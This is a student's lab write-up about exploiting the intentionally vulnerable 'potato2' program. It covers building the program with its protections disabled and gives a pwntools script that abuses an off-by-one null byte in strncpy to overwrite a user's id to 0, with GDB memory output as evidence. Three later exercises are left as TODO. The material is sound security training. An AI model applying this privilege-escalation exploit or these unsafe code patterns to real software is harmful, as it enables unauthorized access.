# Heap Corruption

Student: Philip Magnus

The steps in this writeup were performed on a Kali 2024.4 (x64) system.

## Building potato

For the building process the following packages have been installed.

```bash
$ sudo apt install gcc gcc-multilib glibc-source libc6-dbg:i386 python3-virtualenv -y
```

To install the *GDB Enhanced Features* suite (GEF) the following `curl` command was used.

```bash
$ bash -c "$(curl -fsSL https://gef.blah.cat/sh)"
```

Next the source files for potato2 were checked out with its git repository.

```bash
$ git clone https://github.com/edgecase1/potato2.git
```

Checkout the sources openssl, this is required because we are going to build potato2 as 32 bit binary, therefore the openssl libraries need to be available as 32 bit as well.

```bash
git clone https://github.com/edgecase1/potato2.git
git clone https://github.com/openssl/openssl.git
cd openssl
./Configure -m32 linux-generic32
make -sj
```
Using the following `Makefile` two 32 bit binaries have been build to run the attacks against in the subsequent steps.

```make
# needs to have openssl checked out as sibling folder of potato
# git clone https://github.com/openssl/openssl.git
# and requires installation of gcc multilib
# sudo apt install gcc-multilib for m32

WARN_OPTS=-Wno-deprecated-declarations -Wno-unused-result
SEC_OPTS=-fno-stack-protector -z execstack -no-pie
DEBUG_OPTS=-ggdb3 -O0
# turn on optimizations to get some ROP gadgets
DEBUG_OPTS_ROP=-ggdb3 -O2
INCLUDES=-Iopenssl/include -I/usr/include -I/usr/include/x86_64-linux-gnu -Ipotato2/src
DEFINES=-D_FORTIFY_SOURCE=0

CCOPTS = $(WARN_OPTS) $(SEC_OPTS) $(DEBUG_OPTS) $(INCLUDES) $(DEFINES)
# include glibc statically to get additional gadgets
CCOPTS4ROP = -static $(WARN_OPTS) $(SEC_OPTS) $(DEBUG_OPTS_ROP) $(INCLUDES) $(DEFINES)

CFILES = \
	potato2/src/main.c \
	potato2/src/runr.c \
	potato2/src/sock.c \
	potato2/src/userlist.c \
	potato2/src/func.c \
	potato2/src/login2.c

HFILES = \
	potato2/src/runr.h \
	potato2/src/sock.h \
	potato2/src/user.h \
	potato2/src/userlist.h 

.PHONY: clean all

all: potato potato_rop potato_32 potato_rop_32

# binary for usual attacks
potato: $(CFILES) $(HFILES)
	gcc $(CCOPTS) -o potato $(CFILES) -Lopenssl  -lssl -lcrypto 

# binary for ROP attack
potato_rop: $(CFILES) $(HFILES)
	gcc $(CCOPTS4ROP) -o potato_rop $(CFILES) -Lopenssl  -lssl -lcrypto

potato_32: $(CFILES) $(HFILES)
	gcc -m32 $(CCOPTS) -o potato_32 $(CFILES) -Lopenssl  -lssl -lcrypto 

potato_rop_32: $(CFILES) $(HFILES)
	gcc -m32 $(CCOPTS4ROP) -o potato_rop_32 $(CFILES) -Lopenssl  -lssl -lcrypto

clean:
	rm -f potato potato_rop potato_32 potato_rop_32
```

The `potato` and `potato_rop` files were built using the `make` command.

```bash
$ make

gcc -Wno-deprecated-declarations -Wno-unused-result -fno-stack-protector -z execstack -no-pie -ggdb3 -O0 -Iopenssl/include -I/usr/include -I/usr/include/x86_64-linux-gnu -Ipotato2/src -D_FORTIFY_SOURCE=0 -o potato src/main.c src/runr.c src/sock.c src/userlist.c src/func.c src/login2.c -Lopenssl  -lssl -lcrypto
gcc -static -Wno-deprecated-declarations -Wno-unused-result -fno-stack-protector -z execstack -no-pie -ggdb3 -O2 -Iopenssl/include -I/usr/include -I/usr/include/x86_64-linux-gnu -Ipotato2/src -D_FORTIFY_SOURCE=0 -o potato_rop src/main.c src/runr.c src/sock.c src/userlist.c src/func.c src/login2.c -Lopenssl  -lssl -lcrypto
```

The `potato` executables can now be used as follows.

```bash
$ ./potato

./potato console
./potato server
```

To enable our Python scripts to run attacks against the `potato` binaries as well as starting the debugger and many more QoL features `pwntools` was installed using `pip3`.

```bash 
$ virtualenv venv
$. ./venv/bin/activate
$ pip3 install pwntools
$ git clone https://github.com/cloudburst/libheap
$ pip3 install ./libheap/
```

## Overwrite a user (t_user) structure to gain privileges

By analyzing the code we can see that it might be possible to overwrite the currently logged in users information to gain priviledged access. For this the global user struct needs to be overwritten in a specific way.

```C
int
is_privileged()
{
    t_user* user = session.logged_in_user;
     if(user->id < 1 || user->gid < 1) // is a root user
     {
          return 1;
     }
     else
     {
          fprintf(stderr, "privileged users only!");
          return 0;
     }
}
```

The `is_priviledged()` function is used to check if a user has the necessary `id` to have priviledged rights. In this example the `id` needs to be `< 1`to gain priviledged access.

A normal user does not have a fitting `id`. We can exploit a weakness in the `change_name()` function. The `strncpy()` function call always appends a `0x00` byte to the end of the string. This byte is known as a null-terminator.

```C
void
change_name()
{
    char input_username[USERNAME_LENGTH];
        
    fprintf(stdout, "What is the name > ");
    //fgets(input_username, sizeof(input_username), stdin);
    fscanf(stdin, "%s", input_username); // TODO security
    input_username[strcspn(input_username, "\n")] = 0x00; // terminator instead of a newline

    strncpy(session.logged_in_user->name, input_username, strlen(input_username)+1);
    fprintf(stdout, "Name changed.\n");
}
```
If we take a closer look at the `_user` struct we can see that the `id`is positioned 52 bytes after the beginning of the struct.

In combination with the unsafe `strncpy()` call we can craft a specific payload to set the `id` of our currently logged in user to 0.

```C
struct _user
{
     char name[20];
     char password_hash[32]; // md5
     int id;
     int gid;
     char home[50];
     char shell[50];
} typedef t_user;
```

If we provide a long enought string we will overwrite the `name`, `password_hash` and set our `id` to 0. The current users `id` if we are logged in as _peter_ is 1000 (represented in hex 0x2710).
In our little endian architecture we can see our current `id` represented in memory as `0x10 0x27 0x00 0x00`.

```bash
gef➤  x/4bx &session->logged_in_user->id
0x8050464:      0x10    0x27    0x00    0x00
```

To check if our theory of the 52 byte space we need to override is correct we check the current address layout in memory.

```bash
gef➤  p &session->logged_in_user->id
$1 = (int *) 0x8050464
gef➤  p &session->logged_in_user->name
$2 = (char (*)[20]) 0x8050430
gef➤  p 0x8050464 - 0x8050430
$3 = 0x34
```

We can see that the address space we need to overwrite is 0x34 bytes big, which is simply the hex representation of 52 bytes.

If we provide a string of length 52 + 1, strncpy will overwrite the 0x27 byte in memory with 0x00. Subsequently providing a string of length 52, strncpy will overwrite the 0x10 byte with 0x00.
We will need to do this in two steps because we can not manually write a 0x00 byte to our desired memory addresses. For this we craft the following script with the needed payloads.

```python3
#!/usr/bin/env python3

from pwn import *
import sys

elf = ELF("./potato_32")
# context.binary = elf
# context.arch = 'i386'
# context.bits = 32
# context.endian = 'little'
# context.os = 'linux'

p = elf.process(["console"], stdin=PTY, aslr=False) # stdin=PTY for "getpass" password input
gdb.attach(p, '''
continue
''')

print(p.recvuntil(b"cmd> ")) # username
p.sendline(b"login")
# test user
p.sendline(b"peter")
p.sendline(b"12345")
print(p.recvuntil(b"cmd> ")) # username

p.sendline(b"changename")
payload = b"\x41"*53
p.sendline(payload)

p.sendline(b"changename")
payload = b"\x41"*52
p.sendline(payload)

p.sendline(b"changename")
payload = b"peter"
p.sendline(payload)

p.interactive()
```

In the first two payloads we overwrite the current `id` with `0x00`. After that in our third payload we change the overwritten `username` back to _peter_.

After executing our attack script and switching to our running `potato` program we can check our `id` and thus the given privileges.

```bash
cmd> $ whoami
user(name='peter' id=0 gid=10000 home='/home/peter' shell='/usr/bin/rbash')
```

## find a memory leak to identify a heap bin or chunk (look at the session and whoami; it's enough to show the chunk or memory location in gdb)

**TODO**

## gain a shell with root privileges (look at the allocator with ltrace while creating and deleting users)

**TODO**

## demonstrate a use after free or double free condition in the program

**TODO**